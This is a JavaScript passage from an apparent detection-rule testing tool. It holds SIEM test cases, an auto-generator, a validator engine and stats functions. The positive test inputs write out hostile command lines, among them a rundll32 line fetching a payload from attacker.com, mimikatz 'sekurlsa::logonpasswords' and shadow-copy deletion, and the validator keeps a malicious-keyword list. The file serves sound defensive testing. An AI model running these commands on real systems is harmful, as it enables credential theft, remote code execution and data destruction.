      commandSequence:['whoami /all','systeminfo','ipconfig /all','net user /domain','nltest /dclist:corp.local'],
      timeWindow:'5 minutes', uniqueCommands:5,
      additionalFields:{ CommandLine:'whoami /all' }},
    expectedOutput:{ triggered:true, category:'reconnaissance', mitreMapping:'T1082', severity:'medium',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0033' }},
  { id:'TC-SR0033-NEG-1', type:'negative', name:'Help desk runs single ipconfig — routine troubleshooting',
    description:'Help desk technician runs one ipconfig command to troubleshoot network connectivity.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\helpdesk',
      commandLine:'ipconfig /all', uniqueCommands:1, additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Only 1 unique command — below threshold (>4 unique recon commands in 5 min window)' }}],

'SR-0034': [
  { id:'TC-SR0034-POS-1', type:'positive', name:'Nmap network scan from compromised workstation',
    description:'Attacker runs nmap -sV from compromised user workstation to enumerate internal network.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\compromised',
      image:'C:\\Program Files (x86)\\Nmap\\nmap.exe',
      commandLine:'nmap.exe -sV -p 80,443,22,3389 10.0.0.0/24', additionalFields:{}},
    expectedOutput:{ triggered:true, category:'reconnaissance', mitreMapping:'T1046', severity:'medium',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0034' }},
  { id:'TC-SR0034-NEG-1', type:'negative', name:'Authorized Tenable Nessus scan from approved host',
    description:'Security team runs approved Nessus scan from designated scanner host (allowlisted IP/account).',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\svc_vuln_scanner', sourceIp:'10.0.2.10',
      additionalFields:{ Comment:'Approved scanner account + IP in SIEM allowlist' }},
    expectedOutput:{ triggered:false, reason:'Scanner service account is in tuning allowlist — suppressed by context-based exclusion' }}],

// ━━━ ENDPOINT ANOMALIES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0017': [
  { id:'TC-SR0017-POS-1', type:'positive', name:'Non-system process injects into svchost (CreateRemoteThread)',
    description:'Malware uses CreateRemoteThread from user-space binary to inject into svchost.exe — process injection.',
    input:{ eventId:8, logSource:'Sysmon (CreateRemoteThread)', user:'CORP\\victim',
      sourceImage:'C:\\Users\\victim\\AppData\\Roaming\\malware.exe',
      targetImage:'C:\\Windows\\System32\\svchost.exe',
      startAddress:'0x7FFB234A1000',
      additionalFields:{ EventID:8, SourceImage:'malware.exe' }},
    expectedOutput:{ triggered:true, category:'endpoint-anomalies', mitreMapping:'T1055', severity:'critical',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0017' }},
  { id:'TC-SR0017-NEG-1', type:'negative', name:'csrss.exe threads into system process — normal Windows',
    description:'csrss.exe legitimately creates remote threads for Windows subsystem inter-process operations.',
    input:{ eventId:8, logSource:'Sysmon',
      sourceImage:'C:\\Windows\\System32\\csrss.exe',
      targetImage:'C:\\Windows\\System32\\svchost.exe', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'csrss.exe is in the allowlisted Windows system processes (csrss/lsass/svchost/services/wininit)' }}],

// ━━━ WINDOWS SPECIFIC ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0022': [
  { id:'TC-SR0022-POS-1', type:'positive', name:'svchost.exe running from Desktop — system binary masquerading',
    description:'Malware renamed to svchost.exe and executed from user Desktop — process masquerading.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\victim',
      image:'C:\\Users\\victim\\Desktop\\svchost.exe', commandLine:'svchost.exe',
      additionalFields:{ Hashes:'SHA256=a1b2c3d4deadbeef', IntegrityLevel:'Medium' }},
    expectedOutput:{ triggered:true, category:'windows-specific', mitreMapping:'T1036.005', severity:'critical',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0022' }},
  { id:'TC-SR0022-NEG-1', type:'negative', name:'Real svchost.exe from System32 — legitimate Windows process',
    description:'Actual Windows Service Host running from its expected System32 location.',
    input:{ eventId:1, logSource:'Sysmon',
      image:'C:\\Windows\\System32\\svchost.exe',
      commandLine:'svchost.exe -k netsvcs -p', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Image path matches C:\\Windows\\System32 — expected svchost.exe location, excluded by allowlist' }}],

'SR-0023': [
  { id:'TC-SR0023-POS-1', type:'positive', name:'rundll32.exe with JavaScript URL — LOLBin abuse',
    description:'rundll32.exe used with javascript: scheme to load and execute a remote SCT script.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\victim',
      image:'C:\\Windows\\System32\\rundll32.exe',
      commandLine:'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")',
      additionalFields:{}},
    expectedOutput:{ triggered:true, category:'windows-specific', mitreMapping:'T1218.011', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0023' }},
  { id:'TC-SR0023-NEG-1', type:'negative', name:'rundll32.exe loading legitimate DLL export from Program Files',
    description:'rundll32.exe used to call a DLL function from a trusted Program Files location.',
    input:{ eventId:1, logSource:'Sysmon',
      image:'C:\\Windows\\System32\\rundll32.exe',
      commandLine:'rundll32.exe "C:\\Program Files\\SomeApp\\module.dll",InitializeApp',
      additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'DLL from Program Files, no javascript:/http:/Temp/AppData path — legitimate DLL invocation' }}],

// ━━━ CLOUD THREATS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0046': [
  { id:'TC-SR0046-POS-1', type:'positive', name:'AnyDesk installed from Downloads by cmd.exe — unauthorized RAT',
    description:'AnyDesk launched from user Downloads directory with cmd.exe as parent — unauthorized remote access.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\victim',
      image:'C:\\Users\\victim\\Downloads\\AnyDesk.exe',
      parentImage:'C:\\Windows\\System32\\cmd.exe',
      commandLine:'AnyDesk.exe --install C:\\Users\\victim\\AppData\\Local\\AnyDesk',
      additionalFields:{}},
    expectedOutput:{ triggered:true, category:'command-control', mitreMapping:'T1219', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0046' }},
  { id:'TC-SR0046-NEG-1', type:'negative', name:'TeamViewer launched from Program Files by Explorer — IT support',
    description:'IT support opens approved TeamViewer from Program Files via Windows Explorer. Expected.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\it.support',
      image:'C:\\Program Files\\TeamViewer\\TeamViewer.exe',
      parentImage:'C:\\Windows\\explorer.exe',
      commandLine:'TeamViewer.exe', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Parent is Explorer (not suspicious); path is Program Files — matches NOT filter in Sigma rule' }}]

}; // END DETECTION_TEST_CASES

// ══════════════════════════════════════════════════════════════
// AUTO TEST CASE GENERATOR — for rules without explicit cases
// ══════════════════════════════════════════════════════════════
function _buildAutoInput(rule, isMalicious) {
  const catMap = {
    'brute-force':          { eventId:4625, process:'auth event (multiple failures)', commandLine:isMalicious?'N/A — 15 failed EventID 4625':'N/A — 1 failed EventID 4625', additionalFields:{ LogonType:3, IpAddress:isMalicious?'203.0.113.1':'192.168.1.1' }},
    'lateral-movement':     { eventId:4624, process:'network/RDP logon', commandLine:'N/A — auth event', additionalFields:{ LogonType:10 }},
    'privilege-escalation': { eventId:1, process:isMalicious?'elevating binary':'normal process', commandLine:isMalicious?'cmd.exe /c whoami /priv':'notepad.exe' },
    'credential-access':    { eventId:isMalicious?10:4624, process:isMalicious?'credential_tool.exe':'normal logon', commandLine:isMalicious?'sekurlsa::logonpasswords':'normal auth' },
    'defense-evasion':      { eventId:1, process:isMalicious?'net.exe':'explorer.exe', commandLine:isMalicious?'net stop WinDefend':'explorer.exe' },
    'persistence':          { eventId:isMalicious?4698:4663, process:isMalicious?'schtasks.exe':'normal file op', commandLine:isMalicious?'schtasks /create /ru SYSTEM /tr powershell.exe':'normal operation' },
    'execution':            { eventId:1, process:'powershell.exe', commandLine:isMalicious?'powershell.exe -enc JABz...':'powershell.exe Get-Process' },
    'initial-access':       { eventId:1, process:isMalicious?'OUTLOOK.EXE → cmd.exe':'normal browser launch', commandLine:isMalicious?'cmd.exe /c whoami':'chrome.exe https://example.com' },
    'command-control':      { eventId:isMalicious?22:3, process:'dns/network event', commandLine:'N/A', dnsQuery:isMalicious?'encoded.base64data.c2server.com':'www.microsoft.com' },
    'data-exfiltration':    { eventId:1, process:isMalicious?'WinRAR.exe':'7z.exe', commandLine:isMalicious?'WinRAR.exe a archive.rar \\\\share\\sensitive\\*':'7z.exe a build.zip C:\\Dev\\*' },
    'web-attacks':          { eventId:1, process:isMalicious?'w3wp.exe → cmd.exe':'w3wp.exe → aspnet_compiler.exe', commandLine:isMalicious?'cmd.exe /c whoami':'aspnet_compiler.exe -v /' },
    'ransomware':           { eventId:isMalicious?1102:4663, process:isMalicious?'ransomware binary + log clear':'normal file create', commandLine:isMalicious?'vssadmin delete shadows /all /quiet':'normal operation' },
    'reconnaissance':       { eventId:1, process:isMalicious?'nmap.exe':'ping.exe', commandLine:isMalicious?'nmap -sV 10.0.0.0/24':'ping www.google.com' },
    'insider-threat':       { eventId:4624, process:'auth event', commandLine:'N/A', additionalFields:{ LogonType:2, Hour:isMalicious?2:10 }},
    'active-directory':     { eventId:isMalicious?4662:4769, process:'AD DS event', commandLine:'N/A', additionalFields:{ AccessMask:isMalicious?'0x100':'0x0' }},
    'cloud-threats':        { eventId:isMalicious?1:4624, process:isMalicious?'cloud exploit tool':'normal cloud auth', commandLine:isMalicious?'cloud_tool.exe exfil':'normal authentication' },
    'network-anomalies':    { eventId:3, process:'network connection event', commandLine:'N/A', sourceIp:isMalicious?'10.0.5.55':'10.0.1.5', destIp:isMalicious?'45.33.32.156':'8.8.8.8' },
    'endpoint-anomalies':   { eventId:isMalicious?8:1, process:isMalicious?'injector.exe → svchost.exe':'explorer.exe', commandLine:isMalicious?'N/A (CreateRemoteThread)':'normal execution' },
    'linux-threats':        { eventId:isMalicious?1:0, process:isMalicious?'crontab -':'ls -la', commandLine:isMalicious?'* * * * * /tmp/.hidden_backdoor':'ls -la /home/user' },
    'windows-specific':     { eventId:1, process:isMalicious?'svchost.exe from Downloads':'svchost.exe from System32', commandLine:isMalicious?'svchost.exe (wrong path)':'svchost.exe -k netsvcs' },
    'email-threats':        { eventId:1, process:isMalicious?'OUTLOOK.EXE → powershell.exe':'OUTLOOK.EXE → chrome.exe', commandLine:isMalicious?'powershell.exe -enc ...':'chrome.exe https://...' },
    'threat-hunting':       { eventId:isMalicious?1:4624, process:isMalicious?'hunting IOC behavior':'normal process', commandLine:isMalicious?'suspicious hunting indicator':'normal usage' }
  };
  const catInput = catMap[rule.category] || { eventId:1, process:'process_creation', commandLine:isMalicious?'suspicious_command':'normal_command' };
  return {
    logSource: `${rule.logsource.product||'windows'} / ${rule.logsource.category||rule.logsource.service||'security'}`,
    user: isMalicious ? 'CORP\\attacker' : 'CORP\\normal.user',
    sourceIp: isMalicious ? '185.220.101.34' : '10.0.1.5',
    ...catInput,
    additionalFields: catInput.additionalFields || {}
  };
}

function generateAutoTestCases(rule) {
  return [
    { id:`TC-${rule.id}-AUTO-POS`, type:'positive', isAutoGenerated:true,
      name:`Auto: Simulated malicious event matching "${rule.title}"`,
      description:`Auto-generated positive test case. Simulates conditions that SHOULD trigger this detection for ${rule.category} attacks. Manually refine for production validation.`,
      input: _buildAutoInput(rule, true),
      expectedOutput:{ triggered:true, category:rule.category, mitreMapping:rule.techniqueId, severity:rule.severity,
        sigmaLogicMatched:true, splunkQueryReturnsMatch:!!(rule.splunkQuery), qradarQueryReturnsMatch:!!(rule.qradarQuery),
        correctRuleAssociation:rule.id, notes:'Auto-generated — review and refine for accuracy' }},
    { id:`TC-${rule.id}-AUTO-NEG`, type:'negative', isAutoGenerated:true,
      name:`Auto: Benign event that should NOT trigger "${rule.title}"`,
      description:`Auto-generated negative test case. Simulates normal behavior that should NOT trigger this detection. Manually refine for production validation.`,
      input: _buildAutoInput(rule, false),
      expectedOutput:{ triggered:false, reason:`Normal activity that does not match ${rule.title} detection logic — review Sigma conditions to verify`,
        notes:'Auto-generated — review and refine for accuracy' }}
  ];
}

// ══════════════════════════════════════════════════════════════
// MAIN ACCESSOR — get test cases for any rule
// ══════════════════════════════════════════════════════════════
function getTestCasesForRule(rule) {
  const explicit = DETECTION_TEST_CASES[rule.id];
  return (explicit && explicit.length > 0) ? explicit : generateAutoTestCases(rule);
}

// ══════════════════════════════════════════════════════════════
// VALIDATION STATE MANAGER (localStorage persistence)
// ══════════════════════════════════════════════════════════════
const ValidationStateManager = {
  _cache: null,
  _load() {
    if (this._cache) return this._cache;
    try { this._cache = JSON.parse(localStorage.getItem(VALIDATION_STORAGE_KEY) || '{}'); }
    catch(e) { this._cache = {}; }
    return this._cache;
  },
  _save() {
    try { localStorage.setItem(VALIDATION_STORAGE_KEY, JSON.stringify(this._cache)); } catch(e) {}
  },
  getStatus(testId) { return (this._load()[testId] || {}).status || 'not_tested'; },
  getResult(testId) { return this._load()[testId] || null; },
  setResult(testId, result) {
    this._load();
    this._cache[testId] = { ...result, timestamp: new Date().toISOString() };
    this._save();
  },
  resetAll() { this._cache = {}; this._save(); },
  resetRule(ruleId) {
    this._load();
    Object.keys(this._cache).filter(k => k.includes(ruleId)).forEach(k => delete this._cache[k]);
    this._save();
  }
};

// ══════════════════════════════════════════════════════════════
// IN-BROWSER DETECTION VALIDATOR ENGINE
// ══════════════════════════════════════════════════════════════
const DetectionValidator = {
  runTestCase(tc, rule) {
    const checks = {
      sigmaStructureValid:    this._chkSigmaStructure(rule),
      triggersCorrectly:      this._chkTrigger(tc, rule),
      categoryCorrect:        this._chkCategory(tc, rule),
      mitreCorrect:           this._chkMitre(tc, rule),
      severityCorrect:        this._chkSeverity(tc, rule),
      splunkConsistent:       this._chkSplunk(rule),
      qradarConsistent:       this._chkQRadar(rule),
      wazuhConsistent:        this._chkWazuh(rule),
      crossSiemParity:        this._chkCrossSIEM(rule),
      ruleAssociationCorrect: this._chkAssociation(tc, rule)
    };
    const values = Object.values(checks);
    const allPassed = values.every(c => c.passed);
    const anyFailed = values.some(c => !c.passed);
    const status = allPassed ? 'passed' : (anyFailed ? 'failed' : 'needs_review');
    const result = { testId:tc.id, ruleId:rule.id, checks, status, timestamp:new Date().toISOString() };
    ValidationStateManager.setResult(tc.id, result);
    return result;
  },
  runRuleTests(rule) {
    return getTestCasesForRule(rule).map(tc => this.runTestCase(tc, rule));
  },
  runAllTests(onProgress) {
    const rules = (typeof SIGMA_RULES !== 'undefined') ? SIGMA_RULES : [];
    const results = [];
    rules.forEach((rule, i) => {
      results.push(...this.runRuleTests(rule));
      if (onProgress) onProgress(i+1, rules.length);
    });
    return results;
  },

  // ── Individual check implementations ────────────────────────
  _chkSigmaStructure(rule) {
    const y = rule.sigmaYaml || '';
    const ok = y.includes('title:') && y.includes('logsource:') && y.includes('detection:') && y.includes('condition:');
    const missing = [!y.includes('title:')&&'title', !y.includes('logsource:')&&'logsource', !y.includes('detection:')&&'detection', !y.includes('condition:')&&'condition'].filter(Boolean);
    return { passed:ok, label:'Sigma rule has valid structure (title, logsource, detection, condition)', detail: ok ? 'All required Sigma YAML fields present and valid' : `Missing required fields: ${missing.join(', ')}` };
  },
  _chkTrigger(tc, rule) {
    if (tc.type === 'positive') {
      const yaml = (rule.sigmaYaml||'').toLowerCase();
      const expl = (rule.detectionExplanation||'').toLowerCase();
      const inStr = JSON.stringify(tc.input).toLowerCase();
      const tokens = (inStr.match(/\b\w{4,}\b/g)||[]).slice(0,30);
      const matches = tokens.filter(t => yaml.includes(t)||expl.includes(t)).length;
      const hasEvId = tc.input.eventId ? (yaml.includes(String(tc.input.eventId))||yaml.includes('eventid')) : true;
      const passed = tc.expectedOutput.triggered ? (hasEvId && matches >= 2) : true;
      return { passed, label:`Detection TRIGGERS on matching (positive) input`, detail: passed ? 'Rule logic aligns with test input — detection would fire' : 'Rule logic does not appear to match this input — review Sigma detection conditions' };
    }
    // Negative test: input should NOT contain strong malicious indicators
    const malKw = ['bypass','encode','lsass','mimikatz','dcsync','incognito','sekurlsa'];
    const inLow = JSON.stringify(tc.input).toLowerCase();
    const safe = !malKw.some(k=>inLow.includes(k));
    return { passed:safe, label:'Detection does NOT trigger on benign (negative) input', detail: safe ? 'Benign input correctly lacks malicious indicators' : 'Warning: negative test input may inadvertently contain malicious keywords' };
  },
  _chkCategory(tc, rule) {
    const exp = tc.expectedOutput?.category;
    if (!exp || exp.startsWith('N/A')) return { passed:true, label:'Category not applicable (negative test)', detail:'N/A' };
    const ok = rule.category === exp;
    return { passed:ok, label:`Category correct (expected: ${exp})`, detail: ok ? `Rule category '${rule.category}' matches` : `Mismatch — rule: '${rule.category}', expected: '${exp}'` };
  },
  _chkMitre(tc, rule) {
    const exp = tc.expectedOutput?.mitreMapping;
    if (!exp || exp.startsWith('N/A')) return { passed:true, label:'MITRE mapping N/A (negative test)', detail:'N/A' };
    const ok = rule.techniqueId === exp || exp.startsWith(rule.techniqueId.split('.')[0]) || rule.techniqueId.startsWith(exp.split('.')[0]);
    return { passed:ok, label:`MITRE ATT&CK mapping correct (expected: ${exp})`, detail: ok ? `Rule technique '${rule.techniqueId}' matches expected '${exp}'` : `Mismatch — rule: '${rule.techniqueId}', expected: '${exp}'` };
  },
  _chkSeverity(tc, rule) {
    const exp = tc.expectedOutput?.severity;
    if (!exp || exp.startsWith('N/A')) return { passed:true, label:'Severity N/A (negative test)', detail:'N/A' };
    const ok = rule.severity === exp;
    return { passed:ok, label:`Severity level correct (expected: ${exp})`, detail: ok ? `Rule severity '${rule.severity}' matches` : `Mismatch — rule: '${rule.severity}', expected: '${exp}'` };
  },
  _chkSplunk(rule) {
    if (typeof ValidationEngine !== 'undefined') {
      const v = ValidationEngine.validateSplunk(rule);
      const ok = v.status === 'valid' || v.status === 'warning';
      return { passed:ok, label:'Splunk SPL query validated by engine', detail: ok ? `SPL valid — score: ${v.score}%, alignment: ${v.alignment||'N/A'}%` : `SPL issues: ${v.issues.join('; ')}` };
    }
    const spl = rule.splunkQuery||'';
    if (!spl) return { passed:false, label:'Splunk SPL query exists and is consistent with Sigma logic', detail:'No Splunk SPL query defined for this rule' };
    const yaml = rule.sigmaYaml||'';
    const kw = this._sigmaKeywords(yaml);
    const overlap = kw.filter(k=>spl.toLowerCase().includes(k.toLowerCase())).length;
    const pct = kw.length > 0 ? Math.round((overlap/kw.length)*100) : 80;
    const ok = spl.length > 30 && (pct >= 25 || spl.length > 100);
    return { passed:ok, label:'Splunk SPL reflects Sigma rule detection logic', detail: ok ? `SPL defined; ${pct}% keyword alignment with Sigma YAML` : `Low Splunk/Sigma alignment (${pct}%) — review that SPL covers same event IDs and conditions` };
  },
  _chkQRadar(rule) {
    if (typeof ValidationEngine !== 'undefined') {
      const v = ValidationEngine.validateQRadar(rule);
      const ok = v.status === 'valid' || v.status === 'warning';
      return { passed:ok, label:'QRadar AQL query validated by engine', detail: ok ? `AQL valid — score: ${v.score}%, alignment: ${v.alignment||'N/A'}%` : `AQL issues: ${v.issues.join('; ')}` };
    }
    const aql = rule.qradarQuery||'';
    if (!aql) return { passed:false, label:'QRadar AQL query exists and is consistent with Sigma logic', detail:'No QRadar AQL query defined for this rule' };
    const yaml = rule.sigmaYaml||'';
    const kw = this._sigmaKeywords(yaml);
    const overlap = kw.filter(k=>aql.toLowerCase().includes(k.toLowerCase())).length;
    const pct = kw.length > 0 ? Math.round((overlap/kw.length)*100) : 80;
    const ok = aql.length > 30 && (pct >= 25 || aql.length > 100);
    return { passed:ok, label:'QRadar AQL reflects Sigma rule detection logic', detail: ok ? `AQL defined; ${pct}% keyword alignment with Sigma YAML` : `Low QRadar/Sigma alignment (${pct}%) — review that AQL covers same event IDs and conditions` };
  },
  _chkWazuh(rule) {
    if (typeof ValidationEngine !== 'undefined') {
      const v = ValidationEngine.validateWazuh(rule);
      if (v.status === 'correlation_required') return { passed:true, label:'Wazuh: multi-event correlation required', detail:'Rule requires Wazuh decoder/rule correlation — not a single-query detection' };
      const ok = v.status === 'valid' || v.status === 'warning';
      return { passed:ok, label:'Wazuh KQL query validated by engine', detail: ok ? `Wazuh valid — score: ${v.score}%` : `Wazuh issues: ${v.issues.join('; ')}` };
    }
    return { passed:true, label:'Wazuh validation skipped (engine not loaded)', detail:'ValidationEngine not available' };
  },
  _chkCrossSIEM(rule) {
    if (typeof ValidationEngine !== 'undefined') {
      const v = ValidationEngine.checkCrossConsistency(rule);
      const ok = v.status === 'consistent';
      return { passed:ok, label:'Cross-SIEM consistency check', detail: ok ? `All SIEMs consistent — coverage: ${v.coverage}/3` : `Divergences: ${v.issues.join('; ')}` };
    }
    return { passed:true, label:'Cross-SIEM check skipped (engine not loaded)', detail:'ValidationEngine not available' };
  },
  _chkAssociation(tc, rule) {
    const exp = tc.expectedOutput?.correctRuleAssociation;
    if (!exp) return { passed:true, label:'Rule association N/A', detail:'Not specified in test case' };
    const ok = rule.id === exp;
    return { passed:ok, label:`Test case linked to correct rule (expected: ${exp})`, detail: ok ? `Correctly associated with '${rule.id}'` : `Association mismatch — got '${rule.id}', expected '${exp}'` };
  },
  _sigmaKeywords(yaml) {
    const eids = (yaml.match(/\d{4,5}/g)||[]).slice(0,5);
    const quoted = (yaml.match(/'([^']{3,30})'/g)||[]).slice(0,6).map(s=>s.replace(/'/g,''));
    return [...new Set([...eids,...quoted])];
  }
};

// ══════════════════════════════════════════════════════════════
// GLOBAL STATS & COVERAGE
// ══════════════════════════════════════════════════════════════
function getGlobalTestStats() {
  const rules = typeof SIGMA_RULES !== 'undefined' ? SIGMA_RULES : [];
  const stats = { total:0, passed:0, failed:0, needsReview:0, notTested:0, categories:{} };
  rules.forEach(rule => {
    const tcs = getTestCasesForRule(rule);
    tcs.forEach(tc => {
      stats.total++;
      const s = ValidationStateManager.getStatus(tc.id);
      if(s==='passed') stats.passed++;
      else if(s==='failed') stats.failed++;
      else if(s==='needs_review') stats.needsReview++;
      else stats.notTested++;
    });
  });
  return stats;
}

function getCategoryTestCoverage(catId) {
  const rules = typeof SIGMA_RULES !== 'undefined' ? SIGMA_RULES.filter(r=>r.category===catId) : [];
  const out = { ruleCount:rules.length, total:0, passed:0, failed:0, notTested:0, passRate:0 };
  rules.forEach(rule => {
    getTestCasesForRule(rule).forEach(tc => {
      out.total++;
      const s = ValidationStateManager.getStatus(tc.id);
      if(s==='passed') out.passed++;
      else if(s==='failed') out.failed++;
      else out.notTested++;
    });
  });
  out.passRate = out.total > 0 ? Math.round((out.passed/out.total)*100) : 0;
  return out;
}

function getAllCategoryStats() {
  const cats = typeof SIGMA_RULES !== 'undefined' ? [...new Set(SIGMA_RULES.map(r=>r.category).filter(Boolean))] : [];
  const out = {};
  cats.forEach(c => { out[c] = getCategoryTestCoverage(c); });
  return out;
}

function exportValidationReport() {
  const rules = typeof SIGMA_RULES !== 'undefined' ? SIGMA_RULES : [];
  const report = {
    generated: new Date().toISOString(),
    platform: 'SigmaGuard Detection Testing & Validation SOP',
    version: '1.0',
    summary: getGlobalTestStats(),
    categories: getAllCategoryStats(),
    rules: rules.map(rule => ({
      ruleId: rule.id, title: rule.title, category: rule.category,
      techniqueId: rule.techniqueId, severity: rule.severity,
      hasSplunk: !!(rule.splunkQuery), hasQRadar: !!(rule.qradarQuery),
      testCases: getTestCasesForRule(rule).map(tc=>({
        id:tc.id, type:tc.type, name:tc.name,
        status: ValidationStateManager.getStatus(tc.id),
        result: ValidationStateManager.getResult(tc.id)
      }))
    }))
  };
  return report;
}

// ── Global Exports ───────────────────────────────────────────
window.DETECTION_TEST_CASES   = DETECTION_TEST_CASES;
window.DetectionValidator      = DetectionValidator;
window.ValidationStateManager  = ValidationStateManager;
window.getTestCasesForRule     = getTestCasesForRule;
window.getGlobalTestStats      = getGlobalTestStats;
window.getCategoryTestCoverage = getCategoryTestCoverage;
window.getAllCategoryStats      = getAllCategoryStats;
window.exportValidationReport  = exportValidationReport;
window.VALIDATION_STATUS       = VALIDATION_STATUS;
window.TEST_TYPE               = TEST_TYPE;
